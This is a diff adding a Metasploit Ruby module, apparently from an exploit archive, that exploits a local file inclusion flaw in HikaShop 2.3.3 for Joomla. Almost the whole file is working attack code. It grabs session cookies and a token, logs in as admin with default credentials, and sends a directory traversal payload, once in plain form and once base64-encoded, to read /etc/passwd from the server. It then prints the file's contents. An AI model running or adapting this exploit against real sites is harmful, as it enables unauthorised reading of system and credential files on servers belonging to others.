@@ -1,0 +1,131 @@
+id: 23073
+date: 01/06/2015
+title: HikaShop 2.3.3 Local File Inclusion Vulnerability
+author: HauntIT
+cves: 
+
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'HikaShop - LFI poc for authenticated users',
+        'Description' => %q{
+                HikaShop 2.3.3 is vulnerable to local file include attack.
+                Authenticated user can read local files from the server.
+
+                Vulnerability was described on https://twitter.com/HauntITBlog
+      },
+      'Author' =>
+        [
+          'HauntIT Blog', # Discovery / msf module
+          'http://hauntit.blogspot.com'
+        ],
+      'License' => MSF_LICENSE,
+      'Privileged' => false,
+      'Platform'   => ['php'],
+      'Arch'       => ARCH_PHP,
+      'Targets' =>
+        [
+          [ 'Automatic', { } ],
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '03.01.2015'))
+      register_options(
+      [
+        OptString.new('TARGETURI', [ true, "Base Joomla directory path", 'joomla']),
+        OptString.new('USERNAME', [ true, "Username to authenticate with", 'admin']),
+        OptString.new('PASSWORD', [ false, "Password to authenticate with", 'admin']),
+        OptRegexp.new('FAILPATTERN', [ false, 'Pattern returned in response if login failed', '/error/'] ),
+      ], self.class)
+    end
+
+  def check
+  end
+
+  def fetchMd5(my_string)
+    if my_string  =~ /([0-9a-fA-F]{32})/
+      return $1
+    end
+    return nil
+  end
+
+
+  def exploit
+    # 1st, we will get cookies and token
+    req1 = send_request_cgi({
+        'method'        => 'GET',
+        'uri'           => normalize_uri(target_uri.path,'administrator','index.php')
+    })
+    cookies = req1['set-cookie']
+    if not req1
+      fail_with("[-] Failed with 1st request")
+    end
+
+    print_status("[+] Resp code: " + req1.code.to_s)
+    print_good("[+] Cookie(s) : " + cookies)
+
+    token_pattern = /(<input type=\"hidden\" name=\"[a-zA-Z0-9]*\" value=\"1\")/
+    if req1.body =~ token_pattern
+      token = fetchMd5(req1.body)
+      print_good("[+] Token : "+ token.to_s)
+    else
+      print_status("[-] Token not found")
+    end
+
+
+    # now we need to do auth using that token and cookies
+    print_status("[+] 2nd request (post with auth)")
+
+    auth = send_request_cgi({
+        'method'        => 'POST',
+        'uri'           => normalize_uri(target_uri.path,'administrator','index.php'),
+        'cookie'        => cookies,
+        'vars_post'     => {
+                'username'      => datastore['USERNAME'],
+                'passwd'        => datastore['PASSWORD'],
+                'option'        => 'com_login',
+                'task'          => 'login',
+                'return'        => 'aW5kZXgucGhwP29wdGlvbj1jb21faGlrYXNob3AmY3RybD12aWV3JnRhc2s9ZWRpdCZpZD0wfGJlZXozfGNvbXBvbmVudHxjb21faGlrYXNob3B8YWRkcmVzc3wuLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dk',
+                token.to_s => 1
+      }
+    })
+
+    print_good("[+] Code after auth: " + auth.code.to_s)
+
+
+    # 3rd step: get + post params to lfi
+    print_status('[+] and now 3rd request...')
+    xpl = send_request_cgi({
+        'method'        => 'GET',
+        'uri'           => normalize_uri(target_uri.path,'administrator','index.php'),
+        'vars_get'      => {
+                 'option'   => 'com_hikashop',
+                 'ctrl'  => 'view',
+                 'task'  => 'edit',
+                 'id'    => '0|beez3|component|com_hikashop|address|../../../../../../../../../../../../../../../../../../etc/passwd'
+        },
+        'cookie'        => cookies
+    })
+
+    if xpl
+      print_good("[+] 3rd response code: " + xpl.code.to_s)
+      print_good("[+] 3rd (full) response body:")
+      print_status(xpl.body)
+    else
+      fail_with("[-] Cannot exploit it :C")
+    end
+  end # exploit
+
+end
+
+#  0day.today [2023-03-21]  #
